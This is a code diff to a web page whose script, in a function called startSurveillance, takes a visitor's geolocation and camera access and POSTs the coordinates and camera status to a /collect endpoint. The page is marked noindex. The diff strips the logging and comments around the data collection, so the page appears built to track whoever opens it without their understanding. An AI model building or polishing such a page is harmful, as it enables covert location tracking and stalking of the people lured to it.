@@ -6,6 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="noindex, nofollow">
   <meta name="googlebot" content="noindex, nofollow">
+  <meta name="google" content="nositelinkssearchbox">
+  <meta name="google" content="notranslate">
   <style>
     body {
       margin: 0;
@@ -57,7 +59,10 @@
       border-radius: 8px;
       margin-bottom: 10px;
       background: #333;
-      line-height: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
     }
 
     video {
@@ -91,7 +96,6 @@
     const cameraView = document.getElementById('cameraView');
 
     async function collectData(cameraStatus, latitude = null, longitude = null) {
-      console.log("📡 Sending to /collect...");
       try {
         await fetch("/collect", {
           method: "POST",
@@ -112,9 +116,10 @@
     async function startSurveillance() {
       let lat = null, lon = null;
 
-      // 🔍 Get Location
       try {
-        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
         lat = pos.coords.latitude;
         lon = pos.coords.longitude;
         mapBox.innerHTML = `📍 Latitude: ${lat.toFixed(4)}<br>📍 Longitude: ${lon.toFixed(4)}`;
@@ -122,12 +127,12 @@
         mapBox.innerHTML = "❌ Location Blocked";
       }
 
-      // 📷 Camera Stream
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
         video.autoplay = true;
+        video.playsInline = true;
         cameraView.innerHTML = '';
         cameraView.appendChild(video);
         collectData("✅ Camera Allowed", lat, lon);
